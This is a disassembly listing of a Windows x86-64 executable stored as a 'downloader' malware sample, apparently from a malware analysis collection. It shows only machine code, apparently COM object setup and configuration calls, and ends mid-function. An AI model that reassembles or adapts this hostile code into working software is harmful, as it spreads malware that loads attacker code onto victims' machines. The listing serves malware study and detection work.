
malware_samples/downloader/3f791c60419a32c215ad1adb2a551909bffbc430b77439e318891b25cf5f8144.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001005:	57                   	push   %rdi
   140001006:	48 83 ec 20          	sub    $0x20,%rsp
   14000100a:	48 8b 19             	mov    (%rcx),%rbx
   14000100d:	48 8b f9             	mov    %rcx,%rdi
   140001010:	48 85 db             	test   %rbx,%rbx
   140001013:	74 4e                	je     0x140001063
   140001015:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000101a:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000101f:	83 f8 01             	cmp    $0x1,%eax
   140001022:	75 38                	jne    0x14000105c
   140001024:	48 8b 0b             	mov    (%rbx),%rcx
   140001027:	48 85 c9             	test   %rcx,%rcx
   14000102a:	74 0d                	je     0x140001039
   14000102c:	ff 15 b6 30 00 00    	call   *0x30b6(%rip)        # 0x1400040e8
   140001032:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140001039:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000103d:	48 85 c9             	test   %rcx,%rcx
   140001040:	74 0d                	je     0x14000104f
   140001042:	e8 89 0f 00 00       	call   0x140001fd0
   140001047:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   14000104e:	00 
   14000104f:	ba 18 00 00 00       	mov    $0x18,%edx
   140001054:	48 8b cb             	mov    %rbx,%rcx
   140001057:	e8 74 0f 00 00       	call   0x140001fd0
   14000105c:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   140001063:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001068:	48 83 c4 20          	add    $0x20,%rsp
   14000106c:	5f                   	pop    %rdi
   14000106d:	c3                   	ret
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	48 ff 25 69 30 00 00 	rex.W jmp *0x3069(%rip)        # 0x1400040e0
   140001077:	cc                   	int3
   140001078:	cc                   	int3
   140001079:	cc                   	int3
   14000107a:	cc                   	int3
   14000107b:	cc                   	int3
   14000107c:	cc                   	int3
   14000107d:	cc                   	int3
   14000107e:	cc                   	int3
   14000107f:	cc                   	int3
   140001080:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001085:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000108a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000108f:	55                   	push   %rbp
   140001090:	41 56                	push   %r14
   140001092:	41 57                	push   %r15
   140001094:	48 8d ac 24 50 ff ff 	lea    -0xb0(%rsp),%rbp
   14000109b:	ff 
   14000109c:	48 81 ec b0 01 00 00 	sub    $0x1b0,%rsp
   1400010a3:	48 8b 05 96 4f 00 00 	mov    0x4f96(%rip),%rax        # 0x140006040
   1400010aa:	48 33 c4             	xor    %rsp,%rax
   1400010ad:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   1400010b4:	33 d2                	xor    %edx,%edx
   1400010b6:	33 c9                	xor    %ecx,%ecx
   1400010b8:	ff 15 d2 31 00 00    	call   *0x31d2(%rip)        # 0x140004290
   1400010be:	85 c0                	test   %eax,%eax
   1400010c0:	0f 88 8e 01 00 00    	js     0x140001254
   1400010c6:	45 33 ff             	xor    %r15d,%r15d
   1400010c9:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   1400010ce:	44 89 7c 24 38       	mov    %r15d,0x38(%rsp)
   1400010d3:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400010d8:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%rsp)
   1400010df:	00 
   1400010e0:	c7 44 24 20 06 00 00 	movl   $0x6,0x20(%rsp)
   1400010e7:	00 
   1400010e8:	45 33 c9             	xor    %r9d,%r9d
   1400010eb:	45 33 c0             	xor    %r8d,%r8d
   1400010ee:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   1400010f3:	8b d7                	mov    %edi,%edx
   1400010f5:	33 c9                	xor    %ecx,%ecx
   1400010f7:	ff 15 8b 31 00 00    	call   *0x318b(%rip)        # 0x140004288
   1400010fd:	8b d8                	mov    %eax,%ebx
   1400010ff:	85 c0                	test   %eax,%eax
   140001101:	0f 88 45 01 00 00    	js     0x14000124c
   140001107:	4c 89 7d 58          	mov    %r15,0x58(%rbp)
   14000110b:	48 8d 45 58          	lea    0x58(%rbp),%rax
   14000110f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001114:	4c 8d 0d 3d 32 00 00 	lea    0x323d(%rip),%r9        # 0x140004358
   14000111b:	33 d2                	xor    %edx,%edx
   14000111d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001123:	48 8d 0d 3e 32 00 00 	lea    0x323e(%rip),%rcx        # 0x140004368
   14000112a:	ff 15 68 31 00 00    	call   *0x3168(%rip)        # 0x140004298
   140001130:	8b d8                	mov    %eax,%ebx
   140001132:	85 c0                	test   %eax,%eax
   140001134:	0f 88 12 01 00 00    	js     0x14000124c
   14000113a:	48 8b 45 58          	mov    0x58(%rbp),%rax
   14000113e:	48 8b 08             	mov    (%rax),%rcx
   140001141:	48 8b 59 50          	mov    0x50(%rcx),%rbx
   140001145:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140001149:	ff 15 81 2f 00 00    	call   *0x2f81(%rip)        # 0x1400040d0
   14000114f:	90                   	nop
   140001150:	0f 10 45 d0          	movups -0x30(%rbp),%xmm0
   140001154:	0f 11 45 f0          	movups %xmm0,-0x10(%rbp)
   140001158:	f2 0f 10 45 e0       	movsd  -0x20(%rbp),%xmm0
   14000115d:	f2 0f 11 45 50       	movsd  %xmm0,0x50(%rbp)
   140001162:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   140001166:	ff 15 64 2f 00 00    	call   *0x2f64(%rip)        # 0x1400040d0
   14000116c:	90                   	nop
   14000116d:	0f 10 45 80          	movups -0x80(%rbp),%xmm0
   140001171:	0f 11 45 10          	movups %xmm0,0x10(%rbp)
   140001175:	f2 0f 10 45 90       	movsd  -0x70(%rbp),%xmm0
   14000117a:	f2 0f 11 45 70       	movsd  %xmm0,0x70(%rbp)
   14000117f:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140001183:	ff 15 47 2f 00 00    	call   *0x2f47(%rip)        # 0x1400040d0
   140001189:	90                   	nop
   14000118a:	0f 10 45 a0          	movups -0x60(%rbp),%xmm0
   14000118e:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   140001193:	f2 0f 10 45 b0       	movsd  -0x50(%rbp),%xmm0
   140001198:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   14000119e:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   1400011a2:	ff 15 28 2f 00 00    	call   *0x2f28(%rip)        # 0x1400040d0
   1400011a8:	90                   	nop
   1400011a9:	0f 10 45 f0          	movups -0x10(%rbp),%xmm0
   1400011ad:	0f 29 45 f0          	movaps %xmm0,-0x10(%rbp)
   1400011b1:	f2 0f 10 45 50       	movsd  0x50(%rbp),%xmm0
   1400011b6:	f2 0f 11 45 00       	movsd  %xmm0,0x0(%rbp)
   1400011bb:	0f 10 45 10          	movups 0x10(%rbp),%xmm0
   1400011bf:	0f 29 45 10          	movaps %xmm0,0x10(%rbp)
   1400011c3:	f2 0f 10 45 70       	movsd  0x70(%rbp),%xmm0
   1400011c8:	f2 0f 11 45 20       	movsd  %xmm0,0x20(%rbp)
   1400011cd:	0f 10 44 24 60       	movups 0x60(%rsp),%xmm0
   1400011d2:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   1400011d7:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   1400011dd:	f2 0f 11 44 24 70    	movsd  %xmm0,0x70(%rsp)
   1400011e3:	0f 10 45 b8          	movups -0x48(%rbp),%xmm0
   1400011e7:	0f 29 45 30          	movaps %xmm0,0x30(%rbp)
   1400011eb:	f2 0f 10 4d c8       	movsd  -0x38(%rbp),%xmm1
   1400011f0:	f2 0f 11 4d 40       	movsd  %xmm1,0x40(%rbp)
   1400011f5:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400011f9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400011fe:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   140001202:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140001207:	48 8d 55 30          	lea    0x30(%rbp),%rdx
   14000120b:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   14000120f:	ff d3                	call   *%rbx
   140001211:	8b d8                	mov    %eax,%ebx
   140001213:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140001217:	ff 15 c3 2e 00 00    	call   *0x2ec3(%rip)        # 0x1400040e0
   14000121d:	90                   	nop
   14000121e:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140001222:	ff 15 b8 2e 00 00    	call   *0x2eb8(%rip)        # 0x1400040e0
   140001228:	90                   	nop
   140001229:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   14000122d:	ff 15 ad 2e 00 00    	call   *0x2ead(%rip)        # 0x1400040e0
   140001233:	90                   	nop
   140001234:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140001238:	ff 15 a2 2e 00 00    	call   *0x2ea2(%rip)        # 0x1400040e0
   14000123e:	85 db                	test   %ebx,%ebx
   140001240:	79 3e                	jns    0x140001280
   140001242:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   140001246:	48 8b 01             	mov    (%rcx),%rax
   140001249:	ff 50 10             	call   *0x10(%rax)
   14000124c:	ff 15 2e 30 00 00    	call   *0x302e(%rip)        # 0x140004280
   140001252:	8b c3                	mov    %ebx,%eax
   140001254:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   14000125b:	48 33 cc             	xor    %rsp,%rcx
   14000125e:	e8 4d 0d 00 00       	call   0x140001fb0
   140001263:	4c 8d 9c 24 b0 01 00 	lea    0x1b0(%rsp),%r11
   14000126a:	00 
   14000126b:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000126f:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140001273:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140001277:	49 8b e3             	mov    %r11,%rsp
   14000127a:	41 5f                	pop    %r15
   14000127c:	41 5e                	pop    %r14
   14000127e:	5d                   	pop    %rbp
   14000127f:	c3                   	ret
   140001280:	4c 89 7d 78          	mov    %r15,0x78(%rbp)
   140001284:	48 8b 45 58          	mov    0x58(%rbp),%rax
   140001288:	48 8b 08             	mov    (%rax),%rcx
   14000128b:	48 8b 71 38          	mov    0x38(%rcx),%rsi
   14000128f:	b9 18 00 00 00       	mov    $0x18,%ecx
   140001294:	e8 3f 0d 00 00       	call   0x140001fd8
   140001299:	48 8b d8             	mov    %rax,%rbx
   14000129c:	48 89 45 50          	mov    %rax,0x50(%rbp)
   1400012a0:	48 85 c0             	test   %rax,%rax
   1400012a3:	74 32                	je     0x1400012d7
   1400012a5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400012a8:	33 c0                	xor    %eax,%eax
   1400012aa:	0f 11 03             	movups %xmm0,(%rbx)
   1400012ad:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400012b1:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   1400012b5:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400012bc:	48 8d 0d 7d 31 00 00 	lea    0x317d(%rip),%rcx        # 0x140004440
   1400012c3:	ff 15 0f 2e 00 00    	call   *0x2e0f(%rip)        # 0x1400040d8
   1400012c9:	48 89 03             	mov    %rax,(%rbx)
   1400012cc:	48 85 c0             	test   %rax,%rax
   1400012cf:	0f 84 51 08 00 00    	je     0x140001b26
   1400012d5:	eb 03                	jmp    0x1400012da
   1400012d7:	49 8b df             	mov    %r15,%rbx
   1400012da:	48 89 5d 50          	mov    %rbx,0x50(%rbp)
   1400012de:	48 85 db             	test   %rbx,%rbx
   1400012e1:	0f 84 97 08 00 00    	je     0x140001b7e
   1400012e7:	4c 8d 45 78          	lea    0x78(%rbp),%r8
   1400012eb:	48 8b 13             	mov    (%rbx),%rdx
   1400012ee:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   1400012f2:	ff d6                	call   *%rsi
   1400012f4:	8b f0                	mov    %eax,%esi
   1400012f6:	8b cf                	mov    %edi,%ecx
   1400012f8:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   1400012fd:	83 f9 01             	cmp    $0x1,%ecx
   140001300:	75 30                	jne    0x140001332
   140001302:	48 8b 0b             	mov    (%rbx),%rcx
   140001305:	48 85 c9             	test   %rcx,%rcx
   140001308:	74 09                	je     0x140001313
   14000130a:	ff 15 d8 2d 00 00    	call   *0x2dd8(%rip)        # 0x1400040e8
   140001310:	4c 89 3b             	mov    %r15,(%rbx)
   140001313:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001317:	48 85 c9             	test   %rcx,%rcx
   14000131a:	74 09                	je     0x140001325
   14000131c:	e8 af 0c 00 00       	call   0x140001fd0
   140001321:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   140001325:	ba 18 00 00 00       	mov    $0x18,%edx
   14000132a:	48 8b cb             	mov    %rbx,%rcx
   14000132d:	e8 9e 0c 00 00       	call   0x140001fd0
   140001332:	85 f6                	test   %esi,%esi
   140001334:	0f 88 ca 07 00 00    	js     0x140001b04
   14000133a:	48 8b 45 78          	mov    0x78(%rbp),%rax
   14000133e:	48 8b 08             	mov    (%rax),%rcx
   140001341:	48 8b 71 78          	mov    0x78(%rcx),%rsi
   140001345:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000134a:	e8 89 0c 00 00       	call   0x140001fd8
   14000134f:	48 8b d8             	mov    %rax,%rbx
   140001352:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140001356:	48 85 c0             	test   %rax,%rax
   140001359:	74 32                	je     0x14000138d
   14000135b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000135e:	33 c0                	xor    %eax,%eax
   140001360:	0f 11 03             	movups %xmm0,(%rbx)
   140001363:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001367:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   14000136b:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140001372:	48 8d 0d cf 30 00 00 	lea    0x30cf(%rip),%rcx        # 0x140004448
   140001379:	ff 15 59 2d 00 00    	call   *0x2d59(%rip)        # 0x1400040d8
   14000137f:	48 89 03             	mov    %rax,(%rbx)
   140001382:	48 85 c0             	test   %rax,%rax
   140001385:	0f 84 a6 07 00 00    	je     0x140001b31
   14000138b:	eb 03                	jmp    0x140001390
   14000138d:	49 8b df             	mov    %r15,%rbx
   140001390:	48 89 5d 50          	mov    %rbx,0x50(%rbp)
   140001394:	48 85 db             	test   %rbx,%rbx
   140001397:	0f 84 e1 07 00 00    	je     0x140001b7e
   14000139d:	45 33 c0             	xor    %r8d,%r8d
   1400013a0:	48 8b 13             	mov    (%rbx),%rdx
   1400013a3:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   1400013a7:	ff d6                	call   *%rsi
   1400013a9:	90                   	nop
   1400013aa:	8b c7                	mov    %edi,%eax
   1400013ac:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400013b1:	83 f8 01             	cmp    $0x1,%eax
   1400013b4:	75 30                	jne    0x1400013e6
   1400013b6:	48 8b 0b             	mov    (%rbx),%rcx
   1400013b9:	48 85 c9             	test   %rcx,%rcx
   1400013bc:	74 09                	je     0x1400013c7
   1400013be:	ff 15 24 2d 00 00    	call   *0x2d24(%rip)        # 0x1400040e8
   1400013c4:	4c 89 3b             	mov    %r15,(%rbx)
   1400013c7:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400013cb:	48 85 c9             	test   %rcx,%rcx
   1400013ce:	74 09                	je     0x1400013d9
   1400013d0:	e8 fb 0b 00 00       	call   0x140001fd0
   1400013d5:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   1400013d9:	ba 18 00 00 00       	mov    $0x18,%edx
   1400013de:	48 8b cb             	mov    %rbx,%rcx
   1400013e1:	e8 ea 0b 00 00       	call   0x140001fd0
   1400013e6:	4c 89 7d 68          	mov    %r15,0x68(%rbp)
   1400013ea:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   1400013ee:	48 8b 01             	mov    (%rcx),%rax
   1400013f1:	4c 8d 45 68          	lea    0x68(%rbp),%r8
   1400013f5:	33 d2                	xor    %edx,%edx
   1400013f7:	ff 50 48             	call   *0x48(%rax)
   1400013fa:	8b d8                	mov    %eax,%ebx
   1400013fc:	85 c0                	test   %eax,%eax
   1400013fe:	79 19                	jns    0x140001419
   140001400:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140001404:	48 8b 11             	mov    (%rcx),%rdx
   140001407:	ff 52 10             	call   *0x10(%rdx)
   14000140a:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   14000140e:	48 8b 11             	mov    (%rcx),%rdx
   140001411:	ff 52 10             	call   *0x10(%rdx)
   140001414:	e9 33 fe ff ff       	jmp    0x14000124c
   140001419:	4c 89 bd 80 00 00 00 	mov    %r15,0x80(%rbp)
   140001420:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140001424:	48 8b 01             	mov    (%rcx),%rax
   140001427:	48 8d 95 80 00 00 00 	lea    0x80(%rbp),%rdx
   14000142e:	ff 50 38             	call   *0x38(%rax)
   140001431:	85 c0                	test   %eax,%eax
   140001433:	0f 88 6b 01 00 00    	js     0x1400015a4
   140001439:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   140001440:	48 8b 08             	mov    (%rax),%rcx
   140001443:	48 8b 71 50          	mov    0x50(%rcx),%rsi
   140001447:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000144c:	e8 87 0b 00 00       	call   0x140001fd8
   140001451:	48 8b d8             	mov    %rax,%rbx
   140001454:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140001458:	48 85 c0             	test   %rax,%rax
   14000145b:	74 32                	je     0x14000148f
   14000145d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001460:	33 c0                	xor    %eax,%eax
   140001462:	0f 11 03             	movups %xmm0,(%rbx)
   140001465:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001469:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   14000146d:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140001474:	48 8d 0d f5 2f 00 00 	lea    0x2ff5(%rip),%rcx        # 0x140004470
   14000147b:	ff 15 57 2c 00 00    	call   *0x2c57(%rip)        # 0x1400040d8
   140001481:	48 89 03             	mov    %rax,(%rbx)
   140001484:	48 85 c0             	test   %rax,%rax
   140001487:	0f 84 af 06 00 00    	je     0x140001b3c
   14000148d:	eb 03                	jmp    0x140001492
   14000148f:	49 8b df             	mov    %r15,%rbx
   140001492:	48 89 5d 50          	mov    %rbx,0x50(%rbp)
   140001496:	48 85 db             	test   %rbx,%rbx
   140001499:	0f 84 df 06 00 00    	je     0x140001b7e
   14000149f:	48 8b 13             	mov    (%rbx),%rdx
   1400014a2:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400014a9:	ff d6                	call   *%rsi
   1400014ab:	90                   	nop
   1400014ac:	8b c7                	mov    %edi,%eax
   1400014ae:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400014b3:	83 f8 01             	cmp    $0x1,%eax
   1400014b6:	75 30                	jne    0x1400014e8
   1400014b8:	48 8b 0b             	mov    (%rbx),%rcx
   1400014bb:	48 85 c9             	test   %rcx,%rcx
   1400014be:	74 09                	je     0x1400014c9
   1400014c0:	ff 15 22 2c 00 00    	call   *0x2c22(%rip)        # 0x1400040e8
   1400014c6:	4c 89 3b             	mov    %r15,(%rbx)
   1400014c9:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400014cd:	48 85 c9             	test   %rcx,%rcx
   1400014d0:	74 09                	je     0x1400014db
   1400014d2:	e8 f9 0a 00 00       	call   0x140001fd0
   1400014d7:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   1400014db:	ba 18 00 00 00       	mov    $0x18,%edx
   1400014e0:	48 8b cb             	mov    %rbx,%rcx
   1400014e3:	e8 e8 0a 00 00       	call   0x140001fd0
   1400014e8:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   1400014ef:	48 8b 08             	mov    (%rax),%rcx
   1400014f2:	48 8b 71 40          	mov    0x40(%rcx),%rsi
   1400014f6:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400014fb:	e8 d8 0a 00 00       	call   0x140001fd8
   140001500:	48 8b d8             	mov    %rax,%rbx
   140001503:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140001507:	48 85 c0             	test   %rax,%rax
   14000150a:	74 32                	je     0x14000153e
   14000150c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000150f:	33 c0                	xor    %eax,%eax
   140001511:	0f 11 03             	movups %xmm0,(%rbx)
   140001514:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001518:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   14000151c:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140001523:	48 8d 0d 76 2f 00 00 	lea    0x2f76(%rip),%rcx        # 0x1400044a0
   14000152a:	ff 15 a8 2b 00 00    	call   *0x2ba8(%rip)        # 0x1400040d8
   140001530:	48 89 03             	mov    %rax,(%rbx)
   140001533:	48 85 c0             	test   %rax,%rax
   140001536:	0f 84 0b 06 00 00    	je     0x140001b47
   14000153c:	eb 03                	jmp    0x140001541
   14000153e:	49 8b df             	mov    %r15,%rbx
   140001541:	48 89 5d 50          	mov    %rbx,0x50(%rbp)
   140001545:	48 85 db             	test   %rbx,%rbx
   140001548:	0f 84 30 06 00 00    	je     0x140001b7e
   14000154e:	48 8b 13             	mov    (%rbx),%rdx
   140001551:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   140001558:	ff d6                	call   *%rsi
   14000155a:	90                   	nop
   14000155b:	8b c7                	mov    %edi,%eax
   14000155d:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   140001562:	83 f8 01             	cmp    $0x1,%eax
   140001565:	75 30                	jne    0x140001597
   140001567:	48 8b 0b             	mov    (%rbx),%rcx
   14000156a:	48 85 c9             	test   %rcx,%rcx
   14000156d:	74 09                	je     0x140001578
   14000156f:	ff 15 73 2b 00 00    	call   *0x2b73(%rip)        # 0x1400040e8
   140001575:	4c 89 3b             	mov    %r15,(%rbx)
   140001578:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000157c:	48 85 c9             	test   %rcx,%rcx
   14000157f:	74 09                	je     0x14000158a
   140001581:	e8 4a 0a 00 00       	call   0x140001fd0
   140001586:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   14000158a:	ba 18 00 00 00       	mov    $0x18,%edx
   14000158f:	48 8b cb             	mov    %rbx,%rcx
   140001592:	e8 39 0a 00 00       	call   0x140001fd0
   140001597:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   14000159e:	48 8b 01             	mov    (%rcx),%rax
   1400015a1:	ff 50 10             	call   *0x10(%rax)
   1400015a4:	4c 89 7d 60          	mov    %r15,0x60(%rbp)
   1400015a8:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400015ac:	48 8b 01             	mov    (%rcx),%rax
   1400015af:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   1400015b3:	ff 50 78             	call   *0x78(%rax)
   1400015b6:	85 c0                	test   %eax,%eax
   1400015b8:	0f 88 86 01 00 00    	js     0x140001744
   1400015be:	48 8b 45 60          	mov    0x60(%rbp),%rax
   1400015c2:	48 85 c0             	test   %rax,%rax
   1400015c5:	0f 84 79 01 00 00    	je     0x140001744
   1400015cb:	48 8b 00             	mov    (%rax),%rax
   1400015ce:	48 8b 70 40          	mov    0x40(%rax),%rsi
   1400015d2:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400015d7:	e8 fc 09 00 00       	call   0x140001fd8
   1400015dc:	48 8b d8             	mov    %rax,%rbx
   1400015df:	48 89 45 50          	mov    %rax,0x50(%rbp)
   1400015e3:	48 85 c0             	test   %rax,%rax
   1400015e6:	74 32                	je     0x14000161a
   1400015e8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400015eb:	33 c0                	xor    %eax,%eax
   1400015ed:	0f 11 03             	movups %xmm0,(%rbx)
   1400015f0:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400015f4:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   1400015f8:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400015ff:	48 8d 0d e2 2e 00 00 	lea    0x2ee2(%rip),%rcx        # 0x1400044e8
   140001606:	ff 15 cc 2a 00 00    	call   *0x2acc(%rip)        # 0x1400040d8
   14000160c:	48 89 03             	mov    %rax,(%rbx)
   14000160f:	48 85 c0             	test   %rax,%rax
   140001612:	0f 84 3a 05 00 00    	je     0x140001b52
   140001618:	eb 03                	jmp    0x14000161d
   14000161a:	49 8b df             	mov    %r15,%rbx
   14000161d:	48 89 5d 50          	mov    %rbx,0x50(%rbp)
   140001621:	48 85 db             	test   %rbx,%rbx
   140001624:	0f 84 54 05 00 00    	je     0x140001b7e
   14000162a:	48 8b 13             	mov    (%rbx),%rdx
   14000162d:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140001631:	ff d6                	call   *%rsi
   140001633:	90                   	nop
   140001634:	8b c7                	mov    %edi,%eax
   140001636:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000163b:	83 f8 01             	cmp    $0x1,%eax
   14000163e:	75 30                	jne    0x140001670
   140001640:	48 8b 0b             	mov    (%rbx),%rcx
   140001643:	48 85 c9             	test   %rcx,%rcx
   140001646:	74 09                	je     0x140001651
   140001648:	ff 15 9a 2a 00 00    	call   *0x2a9a(%rip)        # 0x1400040e8
   14000164e:	4c 89 3b             	mov    %r15,(%rbx)
   140001651:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001655:	48 85 c9             	test   %rcx,%rcx
   140001658:	74 09                	je     0x140001663
   14000165a:	e8 71 09 00 00       	call   0x140001fd0
   14000165f:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   140001663:	ba 18 00 00 00       	mov    $0x18,%edx
   140001668:	48 8b cb             	mov    %rbx,%rcx
   14000166b:	e8 60 09 00 00       	call   0x140001fd0
   140001670:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140001674:	48 8b 01             	mov    (%rcx),%rax
   140001677:	ba 05 00 00 00       	mov    $0x5,%edx
   14000167c:	ff 50 70             	call   *0x70(%rax)
   14000167f:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140001683:	48 8b 01             	mov    (%rcx),%rax
   140001686:	ba 01 00 00 00       	mov    $0x1,%edx
   14000168b:	ff 90 90 00 00 00    	call   *0x90(%rax)
   140001691:	48 8b 45 60          	mov    0x60(%rbp),%rax
   140001695:	48 8b 08             	mov    (%rax),%rcx
   140001698:	48 8b 71 60          	mov    0x60(%rcx),%rsi
   14000169c:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400016a1:	e8 32 09 00 00       	call   0x140001fd8
   1400016a6:	48 8b d8             	mov    %rax,%rbx
   1400016a9:	48 89 45 50          	mov    %rax,0x50(%rbp)
   1400016ad:	48 85 c0             	test   %rax,%rax
   1400016b0:	74 32                	je     0x1400016e4
   1400016b2:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400016b5:	33 c0                	xor    %eax,%eax
   1400016b7:	0f 11 03             	movups %xmm0,(%rbx)
   1400016ba:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400016be:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   1400016c2:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400016c9:	48 8d 0d 28 2e 00 00 	lea    0x2e28(%rip),%rcx        # 0x1400044f8
   1400016d0:	ff 15 02 2a 00 00    	call   *0x2a02(%rip)        # 0x1400040d8
   1400016d6:	48 89 03             	mov    %rax,(%rbx)
   1400016d9:	48 85 c0             	test   %rax,%rax
   1400016dc:	0f 84 7b 04 00 00    	je     0x140001b5d
   1400016e2:	eb 03                	jmp    0x1400016e7
   1400016e4:	49 8b df             	mov    %r15,%rbx
   1400016e7:	48 89 5d 50          	mov    %rbx,0x50(%rbp)
   1400016eb:	48 85 db             	test   %rbx,%rbx
   1400016ee:	0f 84 8a 04 00 00    	je     0x140001b7e
   1400016f4:	48 8b 13             	mov    (%rbx),%rdx
   1400016f7:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400016fb:	ff d6                	call   *%rsi
   1400016fd:	90                   	nop
   1400016fe:	8b c7                	mov    %edi,%eax
   140001700:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   140001705:	83 f8 01             	cmp    $0x1,%eax
   140001708:	75 30                	jne    0x14000173a
   14000170a:	48 8b 0b             	mov    (%rbx),%rcx
   14000170d:	48 85 c9             	test   %rcx,%rcx
   140001710:	74 09                	je     0x14000171b
   140001712:	ff 15 d0 29 00 00    	call   *0x29d0(%rip)        # 0x1400040e8
   140001718:	4c 89 3b             	mov    %r15,(%rbx)
   14000171b:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000171f:	48 85 c9             	test   %rcx,%rcx
   140001722:	74 09                	je     0x14000172d
   140001724:	e8 a7 08 00 00       	call   0x140001fd0
